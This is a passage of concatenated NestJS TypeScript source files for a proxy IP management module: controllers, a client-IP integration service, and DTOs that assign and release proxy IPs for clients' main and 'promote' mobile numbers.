body.preferredCountry\r\n            );\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Post('clients/:clientId/assign-promote-mobiles-ips')\r\n    @ApiOperation({ summary: 'Assign IPs to client promote mobile numbers' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                promoteMobiles: {\r\n                    type: 'array',\r\n                    items: { type: 'string' },\r\n                    description: 'Array of promote mobile numbers'\r\n                },\r\n                preferredCountry: { type: 'string', description: 'Preferred country code' }\r\n            },\r\n            required: ['promoteMobiles']\r\n        }\r\n    })\r\n    @ApiResponse({ status: 200, description: 'IPs assigned to promote mobiles' })\r\n    async assignIpsToPromoteMobiles(\r\n        @Param('clientId') clientId: string,\r\n        @Body() body: { promoteMobiles: string[]; preferredCountry?: string }\r\n    ): Promise<any> {\r\n        try {\r\n            return await this.clientIpIntegrationService.assignIpsToPromoteMobiles(\r\n                clientId,\r\n                body.promoteMobiles,\r\n                body.preferredCountry\r\n            );\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Delete('mobile/:mobile/ip')\r\n    @ApiOperation({ summary: 'Release IP from a mobile number' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number' })\r\n    @ApiQuery({ name: 'clientId', description: 'Optional client ID for context', required: false })\r\n    @ApiResponse({ status: 200, description: 'IP released successfully' })\r\n    async releaseIpFromMobile(\r\n        @Param('mobile') mobile: string,\r\n        @Query('clientId') clientId?: string\r\n    ): Promise<any> {\r\n        try {\r\n            return await this.clientIpIntegrationService.releaseIpFromMobile(mobile, clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('mobile/:mobile/status')\r\n    @ApiOperation({ summary: 'Check IP assignment status for a mobile number' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number' })\r\n    @ApiResponse({ status: 200, description: 'Mobile IP status retrieved successfully' })\r\n    async checkMobileIpStatus(@Param('mobile') mobile: string): Promise<any> {\r\n        try {\r\n            return await this.clientIpIntegrationService.checkMobileIpStatus(mobile);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n}\r\n","import { Injectable, Logger, NotFoundException, BadRequestException, Inject, forwardRef } from '@nestjs/common';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\r\nimport { IpManagementService } from './ip-management.service';\r\n\r\n@Injectable()\r\nexport class ClientIpIntegrationService {\r\n    private readonly logger = new Logger(ClientIpIntegrationService.name);\r\n\r\n    constructor(\r\n        @Inject(forwardRef(() => ClientService))\r\n        private readonly clientService: ClientService,\r\n        @Inject(forwardRef(() => PromoteClientService))\r\n        private readonly promoteClientService: PromoteClientService,\r\n        private readonly ipManagementService: IpManagementService\r\n    ) {}\r\n\r\n    /**\r\n     * Helper method to get promote mobiles for a client\r\n     */\r\n    private async getPromoteMobiles(clientId: string): Promise<string[]> {\r\n        return await this.clientService.getPromoteMobiles(clientId);\r\n    }\r\n\r\n    /**\r\n     * Auto-assign IPs to all mobile numbers for a client\r\n     * Simplified: No mobileType needed - system handles main and promote mobiles automatically\r\n     */\r\n    async autoAssignIpsToClient(clientId: string): Promise<{\r\n        clientId: string;\r\n        mainMobile: { mobile: string; ipAddress: string | null; status: string };\r\n        promoteMobiles: Array<{ mobile: string; ipAddress: string | null; status: string }>;\r\n        summary: {\r\n            totalMobiles: number;\r\n            assigned: number;\r\n            failed: number;\r\n            errors: string[];\r\n        };\r\n    }> {\r\n        if (!clientId || clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required');\r\n        }\r\n\r\n        this.logger.debug(`Auto-assigning IPs to all mobiles for client: ${clientId}`);\r\n\r\n        try {\r\n            // Get client data\r\n            const client = await this.clientService.findOne(clientId);\r\n            if (!client) {\r\n                throw new NotFoundException(`Client ${clientId} not found`);\r\n            }\r\n\r\n            if (!client.mobile || client.mobile.trim() === '') {\r\n                throw new BadRequestException(`Client ${clientId} does not have a valid main mobile number`);\r\n            }\r\n\r\n            const errors: string[] = [];\r\n            let assigned = 0;\r\n            let failed = 0;\r\n\r\n            // Handle main mobile\r\n            let mainMobileResult: { mobile: string; ipAddress: string | null; status: string };\r\n            try {\r\n                const mainMapping = await this.ipManagementService.assignIpToMobile({\r\n                    mobile: client.mobile,\r\n                    clientId: client.clientId\r\n                });\r\n                mainMobileResult = {\r\n                    mobile: client.mobile,\r\n                    ipAddress: mainMapping.ipAddress,\r\n                    status: 'assigned'\r\n                };\r\n                assigned++;\r\n                this.logger.debug(`Successfully assigned IP ${mainMapping.ipAddress} to main mobile ${client.mobile}`);\r\n            } catch (error) {\r\n                mainMobileResult = {\r\n                    mobile: client.mobile,\r\n                    ipAddress: null,\r\n                    status: 'failed'\r\n                };\r\n                const errorMsg = `Main mobile ${client.mobile}: ${error.message}`;\r\n                errors.push(errorMsg);\r\n                failed++;\r\n                this.logger.error(errorMsg);\r\n            }\r\n\r\n            // Handle promote mobiles\r\n            const promoteMobileResults: Array<{ mobile: string; ipAddress: string | null; status: string }> = [];\r\n            try {\r\n                // Get promote mobiles from PromoteClient collection\r\n                const promoteMobiles = await this.getPromoteMobiles(clientId);\r\n                this.logger.debug(`Found ${promoteMobiles.length} promote mobiles for client ${clientId}`);\r\n                \r\n                for (const promoteMobile of promoteMobiles) {\r\n                    if (!promoteMobile || promoteMobile.trim() === '') {\r\n                        const errorMsg = `Invalid promote mobile: empty or null`;\r\n                        errors.push(errorMsg);\r\n                        failed++;\r\n                        promoteMobileResults.push({\r\n                            mobile: promoteMobile,\r\n                            ipAddress: null,\r\n                            status: 'failed'\r\n                        });\r\n                        continue;\r\n                    }\r\n\r\n                    try {\r\n                        const promoteMapping = await this.ipManagementService.assignIpToMobile({\r\n                            mobile: promoteMobile,\r\n                            clientId: client.clientId\r\n                        });\r\n                        promoteMobileResults.push({\r\n                            mobile: promoteMobile,\r\n                            ipAddress: promoteMapping.ipAddress,\r\n                            status: 'assigned'\r\n                        });\r\n                        assigned++;\r\n                        this.logger.debug(`Successfully assigned IP ${promoteMapping.ipAddress} to promote mobile ${promoteMobile}`);\r\n                    } catch (error) {\r\n                        promoteMobileResults.push({\r\n                            mobile: promoteMobile,\r\n                            ipAddress: null,\r\n                            status: 'failed'\r\n                        });\r\n                        const errorMsg = `Promote mobile ${promoteMobile}: ${error.message}`;\r\n                        errors.push(errorMsg);\r\n                        failed++;\r\n                        this.logger.error(errorMsg);\r\n                    }\r\n                }\r\n            } catch (error) {\r\n                const errorMsg = `Failed to retrieve promote mobiles for client ${clientId}: ${error.message}`;\r\n                errors.push(errorMsg);\r\n                this.logger.error(errorMsg);\r\n            }\r\n\r\n            const totalMobiles = 1 + promoteMobileResults.length;\r\n\r\n            this.logger.log(`Auto-assignment completed for ${clientId}: ${assigned}/${totalMobiles} assigned, ${failed} failed`);\r\n\r\n            return {\r\n                clientId,\r\n                mainMobile: mainMobileResult,\r\n                promoteMobiles: promoteMobileResults,\r\n                summary: {\r\n                    totalMobiles,\r\n                    assigned,\r\n                    failed,\r\n                    errors\r\n                }\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to auto-assign IPs for client ${clientId}: ${error.message}`);\r\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\r\n                throw error;\r\n            }\r\n            throw new BadRequestException(`Failed to auto-assign IPs for client ${clientId}: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get IP for mobile with intelligent lookup and optional auto-assignment\r\n     * Can determine if mobile is main or promote from client context\r\n     */\r\n    async getIpForMobile(mobile: string, clientId?: string, autoAssign: boolean = false): Promise<string | null> {\r\n        if (!mobile || mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        this.logger.debug(`Getting IP for mobile: ${mobile} (clientId: ${clientId}, autoAssign: ${autoAssign})`);\r\n\r\n        try {\r\n            // Use the IP management service to get existing IP mapping\r\n            const existingIp = await this.ipManagementService.getIpForMobile(mobile);\r\n            if (existingIp) {\r\n                this.logger.debug(`Found existing IP mapping for ${mobile}: ${existingIp}`);\r\n                return existingIp;\r\n            }\r\n\r\n            // If auto-assignment is enabled and clientId provided\r\n            if (autoAssign && clientId) {\r\n                const client = await this.clientService.findOne(clientId);\r\n                if (client) {\r\n                    const isMainMobile = mobile === client.mobile;\r\n                    const { isPromote } = await this.clientService.isPromoteMobile(mobile);\r\n                    \r\n                    if (isMainMobile || isPromote) {\r\n                        this.logger.debug(`Mobile ${mobile} belongs to client ${clientId} as ${isMainMobile ? 'main' : 'promote'} mobile - attempting auto-assignment`);\r\n                        \r\n                        try {\r\n                            const mapping = await this.ipManagementService.assignIpToMobile({\r\n                                mobile,\r\n                                clientId\r\n                            });\r\n                            this.logger.log(`Auto-assigned IP ${mapping.ipAddress} to mobile ${mobile}`);\r\n                            return mapping.ipAddress;\r\n                        } catch (assignError) {\r\n                            this.logger.warn(`Failed to auto-assign IP to mobile ${mobile}: ${assignError.message}`);\r\n                            // Continue to return null instead of throwing error\r\n                        }\r\n                    } else {\r\n                        this.logger.debug(`Mobile ${mobile} does not belong to client ${clientId}`);\r\n                    }\r\n                } else {\r\n                    this.logger.warn(`Client ${clientId} not found`);\r\n                }\r\n            }\r\n\r\n            return null;\r\n        } catch (error) {\r\n            this.logger.error(`Error getting IP for mobile ${mobile}: ${error.message}`);\r\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\r\n                throw error;\r\n            }\r\n            throw new BadRequestException(`Failed to get IP for mobile ${mobile}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get comprehensive IP summary for a client\r\n     * Shows all mobile numbers and their IP assignments\r\n     */\r\n    async getClientIpSummary(clientId: string): Promise<{\r\n        clientId: string;\r\n        clientName: string;\r\n        mainMobile: {\r\n            mobile: string;\r\n            ipAddress: string | null;\r\n            type: 'main';\r\n            status: string;\r\n        };\r\n        promoteMobiles: Array<{\r\n            mobile: string;\r\n            ipAddress: string | null;\r\n            type: 'promote';\r\n            status: string;\r\n        }>;\r\n        dedicatedIps: string[];\r\n        statistics: {\r\n            totalMobiles: number;\r\n            assignedMobiles: number;\r\n            unassignedMobiles: number;\r\n            totalDedicatedIps: number;\r\n        };\r\n    }> {\r\n        if (!clientId || clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required');\r\n        }\r\n\r\n        this.logger.debug(`Getting IP summary for client: ${clientId}`);\r\n\r\n        try {\r\n            // Get client data\r\n            const client = await this.clientService.findOne(clientId);\r\n            if (!client) {\r\n                throw new NotFoundException(`Client ${clientId} not found`);\r\n            }\r\n\r\n            // Get client IP info from client service\r\n            const clientIpInfo = await this.clientService.getClientIpInfo(clientId);\r\n\r\n            // Validate client IP info structure\r\n            if (!clientIpInfo || !clientIpInfo.mainMobile) {\r\n                throw new BadRequestException(`Invalid client IP info structure for client ${clientId}`);\r\n            }\r\n\r\n            // Process main mobile\r\n            const mainMobile = {\r\n                mobile: client.mobile,\r\n                ipAddress: clientIpInfo.mainMobile.ipAddress,\r\n                type: 'main' as const,\r\n                status: clientIpInfo.mainMobile.hasIp ? 'assigned' : 'unassigned'\r\n            };\r\n\r\n            // Process promote mobiles with validation\r\n            const promoteMobilesData = (clientIpInfo.promoteMobiles || []).map(pm => {\r\n                if (!pm || typeof pm.mobile !== 'string') {\r\n                    this.logger.warn(`Invalid promote mobile data found for client ${clientId}`);\r\n                    return null;\r\n                }\r\n                return {\r\n                    mobile: pm.mobile,\r\n                    ipAddress: pm.ipAddress,\r\n                    type: 'promote' as const,\r\n                    status: pm.hasIp ? 'assigned' : 'unassigned'\r\n                };\r\n            }).filter(pm => pm !== null);\r\n\r\n            // Calculate statistics with validation\r\n            const totalMobiles = clientIpInfo.summary?.totalMobiles || (1 + promoteMobilesData.length);\r\n            const assignedMobiles = clientIpInfo.summary?.mobilesWithIp || 0;\r\n            const unassignedMobiles = clientIpInfo.summary?.mobilesWithoutIp || (totalMobiles - assignedMobiles);\r\n\r\n            return {\r\n                clientId,\r\n                clientName: client.name || 'Unknown Client',\r\n                mainMobile,\r\n                promoteMobiles: promoteMobilesData,\r\n                dedicatedIps: clientIpInfo.dedicatedIps || [],\r\n                statistics: {\r\n                    totalMobiles,\r\n                    assignedMobiles,\r\n                    unassignedMobiles,\r\n                    totalDedicatedIps: (clientIpInfo.dedicatedIps || []).length\r\n                }\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to get IP summary for client ${clientId}: ${error.message}`);\r\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\r\n                throw error;\r\n            }\r\n            throw new BadRequestException(`Failed to get IP summary for client ${clientId}: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Assign IP to main mobile number\r\n     * Simplified: No mobileType field needed\r\n     */\r\n    async assignIpToMainMobile(clientId: string, mobile: string, preferredCountry?: string): Promise<{\r\n        clientId: string;\r\n        mobile: string;\r\n        mobileType: 'main';\r\n        ipAddress: string;\r\n        status: string;\r\n    }> {\r\n        this.logger.debug(`Assigning IP to main mobile ${mobile} for client ${clientId}`);\r\n\r\n        // Verify this is actually the main mobile for this client\r\n        const client = await this.clientService.findOne(clientId);\r\n        if (!client) {\r\n            throw new NotFoundException(`Client ${clientId} not found`);\r\n        }\r\n\r\n        if (client.mobile !== mobile) {\r\n            throw new BadRequestException(`Mobile ${mobile} is not the main mobile for client ${clientId}`);\r\n        }\r\n\r\n        const mapping = await this.ipManagementService.assignIpToMobile({\r\n            mobile,\r\n            clientId\r\n        });\r\n\r\n        return {\r\n            clientId,\r\n            mobile,\r\n            mobileType: 'main',\r\n            ipAddress: mapping.ipAddress,\r\n            status: 'assigned'\r\n        };\r\n    }\r\n\r\n    /**\r\n     * Assign IPs to promote mobile numbers\r\n     * Simplified: No mobileType field needed\r\n     */\r\n    async assignIpsToPromoteMobiles(clientId: string, promoteMobiles: string[], preferredCountry?: string): Promise<{\r\n        clientId: string;\r\n        assigned: number;\r\n        failed: number;\r\n        results: Array<{\r\n            mobile: string;\r\n            mobileType: 'promote';\r\n            ipAddress?: string;\r\n            status: string;\r\n            error?: string;\r\n        }>;\r\n    }> {\r\n        this.logger.debug(`Assigning IPs to ${promoteMobiles.length} promote mobiles for client ${clientId}`);\r\n\r\n        // Verify client exists and mobiles are actually promote mobiles\r\n        const client = await this.clientService.findOne(clientId);\r\n        if (!client) {\r\n            throw new NotFoundException(`Client ${clientId} not found`);\r\n        }\r\n\r\n        // Verify all provided mobiles are promote mobiles for this client\r\n        const clientPromoteMobiles = await this.getPromoteMobiles(clientId);\r\n        for (const mobile of promoteMobiles) {\r\n            if (!clientPromoteMobiles.includes(mobile)) {\r\n                throw new BadRequestException(`Mobile ${mobile} is not a promote mobile for client ${clientId}`);\r\n            }\r\n        }\r\n\r\n        const bulkResult = await this.ipManagementService.bulkAssignIpsToMobiles({\r\n            mobiles: promoteMobiles,\r\n            clientId\r\n        });\r\n\r\n        // Transform results to include mobileType\r\n        const results = bulkResult.results.map(result => ({\r\n            mobile: result.mobile,\r\n            mobileType: 'promote' as const,\r\n            ipAddress: result.ipAddress,\r\n            status: result.ipAddress ? 'assigned' : 'failed',\r\n            error: result.error\r\n        }));\r\n\r\n        return {\r\n            clientId,\r\n            assigned: bulkResult.assigned,\r\n            failed: bulkResult.failed,\r\n            results\r\n        };\r\n    }\r\n\r\n    /**\r\n     * Helper method to determine mobile type from client data\r\n     * This shows how we can determine mobile type without storing it in the mapping\r\n     */\r\n    async getMobileType(mobile: string, clientId?: string): Promise<'main' | 'promote' | 'unknown'> {\r\n        if (!mobile || mobile.trim() === '') {\r\n            return 'unknown';\r\n        }\r\n\r\n        if (!clientId) {\r\n            // Try to find clientId from IP mapping\r\n            try {\r\n                const mappings = await this.ipManagementService.getClientMobileMappings(clientId);\r\n                const mapping = mappings.find(m => m.mobile === mobile);\r\n                if (mapping) {\r\n                    clientId = mapping.clientId;\r\n                } else {\r\n                    return 'unknown';\r\n                }\r\n            } catch (error) {\r\n                this.logger.debug(`Could not determine clientId for mobile ${mobile}: ${error.message}`);\r\n                return 'unknown';\r\n            }\r\n        }\r\n\r\n        try {\r\n            const client = await this.clientService.findOne(clientId);\r\n            if (!client) {\r\n                return 'unknown';\r\n            }\r\n\r\n            if (mobile === client.mobile) {\r\n                return 'main';\r\n            } else {\r\n                // Check if mobile is a promote mobile for this client\r\n                const { isPromote } = await this.clientService.isPromoteMobile(mobile);\r\n                return isPromote ? 'promote' : 'unknown';\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Error determining mobile type for ${mobile}: ${error.message}`);\r\n            return 'unknown';\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Release IP from mobile and return it to available pool\r\n     */\r\n    async releaseIpFromMobile(mobile: string, clientId?: string): Promise<{\r\n        mobile: string;\r\n        releasedIp: string | null;\r\n        status: string;\r\n        message: string;\r\n    }> {\r\n        if (!mobile || mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        this.logger.debug(`Releasing IP from mobile: ${mobile}`);\r\n\r\n        try {\r\n            // Check if mobile has an IP assigned\r\n            const currentIp = await this.ipManagementService.getIpForMobile(mobile);\r\n            if (!currentIp) {\r\n                return {\r\n                    mobile,\r\n                    releasedIp: null,\r\n                    status: 'no_ip_assigned',\r\n                    message: `No IP assigned to mobile ${mobile}`\r\n                };\r\n            }\r\n\r\n            // Release the IP\r\n            await this.ipManagementService.releaseIpFromMobile({ mobile });\r\n\r\n            this.logger.log(`Successfully released IP ${currentIp} from mobile ${mobile}`);\r\n\r\n            return {\r\n                mobile,\r\n                releasedIp: currentIp,\r\n                status: 'released',\r\n                message: `Successfully released IP ${currentIp} from mobile ${mobile}`\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to release IP from mobile ${mobile}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to release IP from mobile ${mobile}: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Check if a mobile has an IP assigned\r\n     */\r\n    async checkMobileIpStatus(mobile: string): Promise<{\r\n        mobile: string;\r\n        hasIp: boolean;\r\n        ipAddress: string | null;\r\n        mobileType?: 'main' | 'promote' | 'unknown';\r\n        clientId?: string;\r\n    }> {\r\n        if (!mobile || mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        try {\r\n            const ipAddress = await this.ipManagementService.getIpForMobile(mobile);\r\n            const hasIp = ipAddress !== null;\r\n\r\n            // Try to determine mobile type and client\r\n            let mobileType: 'main' | 'promote' | 'unknown' = 'unknown';\r\n            let clientId: string | undefined;\r\n\r\n            if (hasIp) {\r\n                // Find the mapping to get clientId\r\n                try {\r\n                    // This requires a method to find mapping by mobile - we might need to add this\r\n                    // For now, we'll use the existing logic\r\n                    mobileType = await this.getMobileType(mobile);\r\n                } catch (error) {\r\n                    this.logger.debug(`Could not determine mobile type for ${mobile}: ${error.message}`);\r\n                }\r\n            }\r\n\r\n            return {\r\n                mobile,\r\n                hasIp,\r\n                ipAddress,\r\n                mobileType,\r\n                clientId\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Error checking IP status for mobile ${mobile}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to check IP status for mobile ${mobile}: ${error.message}`);\r\n        }\r\n    }\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsString, IsArray, IsOptional } from 'class-validator';\r\n\r\nexport class AssignIpToMobileDto {\r\n    @ApiProperty({ example: '916265240911', description: 'Mobile number to assign IP to' })\r\n    @IsString()\r\n    mobile: string;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns this mobile number' })\r\n    @IsString()\r\n    clientId: string;\r\n\r\n    @ApiProperty({ example: '192.168.1.100:8080', description: 'Specific IP to assign (optional - if not provided, will auto-assign)', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    preferredIp?: string;\r\n}\r\n\r\nexport class BulkAssignIpDto {\r\n    @ApiProperty({ example: ['916265240911', '916265240912'], description: 'Array of mobile numbers to assign IPs to' })\r\n    @IsArray()\r\n    @IsString({ each: true })\r\n    mobiles: string[];\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns these mobile numbers' })\r\n    @IsString()\r\n    clientId: string;\r\n}\r\n\r\nexport class ReleaseIpFromMobileDto {\r\n    @ApiProperty({ example: '916265240911', description: 'Mobile number to release IP from' })\r\n    @IsString()\r\n    mobile: string;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsString, IsNumber, IsOptional, IsEnum, IsBoolean, IsDateString } from 'class-validator';\r\n\r\nexport class CreateProxyIpDto {\r\n    @ApiProperty({ example: '192.168.1.100', description: 'IP address of the proxy' })\r\n    @IsString()\r\n    ipAddress: string;\r\n\r\n    @ApiProperty({ example: 8080, description: 'Port number of the proxy' })\r\n    @IsNumber()\r\n    port: number;\r\n\r\n    @ApiProperty({ example: 'http', description: 'Protocol type', enum: ['http', 'https', 'socks5'] })\r\n    @IsEnum(['http', 'https', 'socks5'])\r\n    protocol: string;\r\n\r\n    @ApiProperty({ example: 'username', description: 'Username for proxy authentication', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    username?: string;\r\n\r\n    @ApiProperty({ example: 'password', description: 'Password for proxy authentication', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    password?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'], required: false })\r\n    @IsOptional()\r\n    @IsEnum(['active', 'inactive'])\r\n    status?: string;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns this IP', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    assignedToClient?: string;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateProxyIpDto } from './create-proxy-ip.dto';\r\n\r\nexport class UpdateProxyIpDto extends PartialType(CreateProxyIpDto) {}\r\n","import { Controller, Get, Post, Put, Delete, Body, Param, Query, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { \r\n    ApiTags, \r\n    ApiOperation, \r\n    ApiResponse, \r\n    ApiParam, \r\n    ApiQuery, \r\n    ApiBody,\r\n    ApiOkResponse,\r\n    ApiBadRequestResponse,\r\n    ApiNotFoundResponse,\r\n    ApiConflictResponse\r\n} from '@nestjs/swagger';\r\nimport { IpManagementService } from './ip-management.service';\r\nimport { CreateProxyIpDto } from './dto/create-proxy-ip.dto';\r\nimport { UpdateProxyIpDto } from './dto/update-proxy-ip.dto';\r\nimport { CreateIpMobileMappingDto } from './dto/create-ip-mobile-mapping.dto';\r\nimport { UpdateIpMobileMappingDto } from './dto/update-ip-mobile-mapping.dto';\r\nimport { SearchProxyIpDto, SearchIpMobileMappingDto } from './dto/search-ip.dto';\r\nimport { AssignIpToMobileDto, BulkAssignIpDto, ReleaseIpFromMobileDto } from './dto/assign-ip.dto';\r\nimport { ProxyIp } from './schemas/proxy-ip.schema';\r\nimport { IpMobileMapping } from './schemas/ip-mobile-mapping.schema';\r\n\r\n@ApiTags('IP Management')\r\n@Controller('ip-management')\r\nexport class IpManagementController {\r\n    constructor(private readonly ipManagementService: IpManagementService) {}\r\n\r\n    // ==================== PROXY IP MANAGEMENT ====================\r\n\r\n    @Post('proxy-ips')\r\n    @ApiOperation({ summary: 'Create a new proxy IP' })\r\n    @ApiBody({ type: CreateProxyIpDto })\r\n    @ApiOkResponse({ description: 'Proxy IP created successfully', type: ProxyIp })\r\n    @ApiBadRequestResponse({ description: 'Invalid input data' })\r\n    @ApiConflictResponse({ description: 'Proxy IP already exists' })\r\n    async createProxyIp(@Body() createProxyIpDto: CreateProxyIpDto): Promise<ProxyIp> {\r\n        try {\r\n            return await this.ipManagementService.createProxyIp(createProxyIpDto);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Post('proxy-ips/bulk')\r\n    @ApiOperation({ summary: 'Bulk create proxy IPs' })\r\n    @ApiBody({ type: [CreateProxyIpDto] })\r\n    @ApiOkResponse({ description: 'Bulk creation completed' })\r\n    async bulkCreateProxyIps(@Body() proxyIps: CreateProxyIpDto[]): Promise<{ created: number; failed: number; errors: string[] }> {\r\n        try {\r\n            return await this.ipManagementService.bulkCreateProxyIps(proxyIps);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('proxy-ips')\r\n    @ApiOperation({ summary: 'Get all proxy IPs' })\r\n    @ApiOkResponse({ description: 'Proxy IPs retrieved successfully', type: [ProxyIp] })\r\n    async getAllProxyIps(): Promise<ProxyIp[]> {\r\n        try {\r\n            return await this.ipManagementService.findAllProxyIps();\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    // Search functionality temporarily disabled for simplification\r\n    // @Get('proxy-ips/search')\r\n    // @ApiOperation({ summary: 'Search proxy IPs with filters' })\r\n    // @ApiQuery({ name: 'ipAddress', required: false, description: 'IP address to search for' })\r\n    // @ApiQuery({ name: 'port', required: false, description: 'Port number to search for' })\r\n    // @ApiQuery({ name: 'protocol', required: false, description: 'Protocol type', enum: ['http', 'https', 'socks5'] })\r\n    // @ApiQuery({ name: 'country', required: false, description: 'Country code' })\r\n    // @ApiQuery({ name: 'status', required: false, description: 'Status', enum: ['active', 'inactive', 'blocked', 'maintenance'] })\r\n    // @ApiQuery({ name: 'isAssigned', required: false, description: 'Assignment status' })\r\n    // @ApiQuery({ name: 'assignedToClient', required: false, description: 'Client ID' })\r\n    // @ApiQuery({ name: 'provider', required: false, description: 'Provider name' })\r\n    // @ApiOkResponse({ description: 'Search results', type: [ProxyIp] })\r\n    // async searchProxyIps(@Query() searchDto: SearchProxyIpDto): Promise<ProxyIp[]> {\r\n    //     try {\r\n    //         return await this.ipManagementService.searchProxyIps(searchDto);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    // Get specific proxy IP functionality temporarily disabled for simplification\r\n    // @Get('proxy-ips/:ipAddress/:port')\r\n    // @ApiOperation({ summary: 'Get a specific proxy IP' })\r\n    // @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    // @ApiParam({ name: 'port', description: 'Port number' })\r\n    // @ApiOkResponse({ description: 'Proxy IP found', type: ProxyIp })\r\n    // @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    // async getProxyIpById(@Param('ipAddress') ipAddress: string, @Param('port') port: string): Promise<ProxyIp> {\r\n    //     try {\r\n    //         return await this.ipManagementService.findProxyIpById(ipAddress, parseInt(port));\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    //     }\r\n    // }\r\n\r\n    @Put('proxy-ips/:ipAddress/:port')\r\n    @ApiOperation({ summary: 'Update a proxy IP' })\r\n    @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    @ApiParam({ name: 'port', description: 'Port number' })\r\n    @ApiBody({ type: UpdateProxyIpDto })\r\n    @ApiOkResponse({ description: 'Proxy IP updated successfully', type: ProxyIp })\r\n    @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    async updateProxyIp(\r\n        @Param('ipAddress') ipAddress: string,\r\n        @Param('port') port: string,\r\n        @Body() updateProxyIpDto: UpdateProxyIpDto\r\n    ): Promise<ProxyIp> {\r\n        try {\r\n            return await this.ipManagementService.updateProxyIp(ipAddress, parseInt(port), updateProxyIpDto);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Delete('proxy-ips/:ipAddress/:port')\r\n    @ApiOperation({ summary: 'Delete a proxy IP' })\r\n    @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    @ApiParam({ name: 'port', description: 'Port number' })\r\n    @ApiOkResponse({ description: 'Proxy IP deleted successfully' })\r\n    @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    @ApiBadRequestResponse({ description: 'Cannot delete assigned IP' })\r\n    async deleteProxyIp(@Param('ipAddress') ipAddress: string, @Param('port') port: string): Promise<{ message: string }> {\r\n        try {\r\n            await this.ipManagementService.deleteProxyIp(ipAddress, parseInt(port));\r\n            return { message: 'Proxy IP deleted successfully' };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    // ==================== IP-MOBILE MAPPING MANAGEMENT ====================\r\n\r\n    // Get all mappings functionality temporarily disabled for simplification\r\n    // Use getClientMappings with specific clientId instead\r\n    // @Get('mappings')\r\n    // @ApiOperation({ summary: 'Get all IP-mobile mappings' })\r\n    // @ApiOkResponse({ description: 'Mappings retrieved successfully', type: [IpMobileMapping] })\r\n    // async getAllMappings(): Promise<IpMobileMapping[]> {\r\n    //     try {\r\n    //         // For simplified system, return all active mappings across all clients\r\n    //         const allMappings = await this.ipMobileMappingModel.find({ status: 'active' }).lean();\r\n    //         return allMappings;\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    //     }\r\n    // }\r\n\r\n    // Search functionality temporarily disabled for simplification\r\n    // @Get('mappings/search')\r\n    // @ApiOperation({ summary: 'Search IP-mobile mappings 